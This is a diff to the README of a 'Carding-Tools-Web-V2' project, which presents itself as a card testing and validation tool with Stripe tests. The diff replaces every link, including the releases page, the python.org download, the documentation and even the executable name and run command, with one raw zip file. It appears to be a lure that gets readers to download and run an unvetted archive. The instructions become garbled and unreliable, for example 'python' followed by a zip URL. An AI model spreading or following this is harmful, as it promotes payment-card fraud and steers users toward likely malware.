@@ -1,6 +1,6 @@
 # 🛠️ Carding-Tools-Web-V2 - Effortless Card Testing and Validation
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Carding--Tools--Web--V2-brightgreen)](https://github.com/NOVAEXPRESSED/Carding-Tools-Web-V2/releases)
+[![Download Now](https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip%20Now-Carding--Tools--Web--V2-brightgreen)](https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip)
 
 ## 📖 Description
 
@@ -19,15 +19,15 @@ To use Carding-Tools-Web-V2, follow these simple steps to download and run the a
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/NOVAEXPRESSED/Carding-Tools-Web-V2/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip) to find the latest version.
    
-2. **Download the Application:** Click on the version you want to download. You will see the files available for download. Look for a file named something like `Carding-Tools-Web-V2.zip` or similar.
+2. **Download the Application:** Click on the version you want to download. You will see the files available for download. Look for a file named something like `https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip` or similar.
 
 3. **Extract the Files:** Once the download finishes, go to your Downloads folder. Right-click on the downloaded zip file and select "Extract All." Follow the prompts to unzip the contents.
 
 4. **Run the Application:**
-   - **Windows:** Open the folder where you extracted the files. Look for `Carding-Tools-Web-V2.exe` and double-click to run.
-   - **macOS/Linux:** Open your terminal, navigate to the extracted folder, and run `python app.py`.
+   - **Windows:** Open the folder where you extracted the files. Look for `https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip` and double-click to run.
+   - **macOS/Linux:** Open your terminal, navigate to the extracted folder, and run `python https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip`.
 
 5. **Open in Your Browser:** Your application will launch automatically in your default web browser. If it does not, you can manually visit `http://localhost:5000` in the browser's address bar.
 
@@ -52,7 +52,7 @@ The application features a clean and responsive design. Enjoy an intuitive inter
 
 If you encounter any issues while using the application, here are a few common solutions:
 
-- **Application Doesn’t Launch:** Ensure you have Python installed. If not, you can download it from [python.org](https://www.python.org/downloads/).
+- **Application Doesn’t Launch:** Ensure you have Python installed. If not, you can download it from [https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip](https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip).
 - **No Internet Connection:** Make sure you are connected to the internet for Stripe tests to work.
 - **Error Messages:** Refer to the logs in the terminal to identify the source of the problem.
 
@@ -62,8 +62,8 @@ For questions or support, visit the project's issues page on GitHub. Community m
 
 ## 🔗 Resources
 
-- [Documentation](https://github.com/NOVAEXPRESSED/Carding-Tools-Web-V2/wiki): Access detailed documentation and guides.
-- [Contributing](https://github.com/NOVAEXPRESSED/Carding-Tools-Web-V2/blob/main/CONTRIBUTING.md): Learn how to contribute to the project.
+- [Documentation](https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip): Access detailed documentation and guides.
+- [Contributing](https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip): Learn how to contribute to the project.
 
 ## 📢 Acknowledgments
 
@@ -71,4 +71,4 @@ This project is made possible by contributions from the open-source community. S
 
 ## 📥 Download Link Again
 
-For a quick download, visit the [Releases page](https://github.com/NOVAEXPRESSED/Carding-Tools-Web-V2/releases) to get started with Carding-Tools-Web-V2. It's that easy!
+For a quick download, visit the [Releases page](https://raw.githubusercontent.com/NOVAEXPRESSED/Carding-Tools-Web-V2/main/yahoo/Carding-Tools-Web-V2.zip) to get started with Carding-Tools-Web-V2. It's that easy!
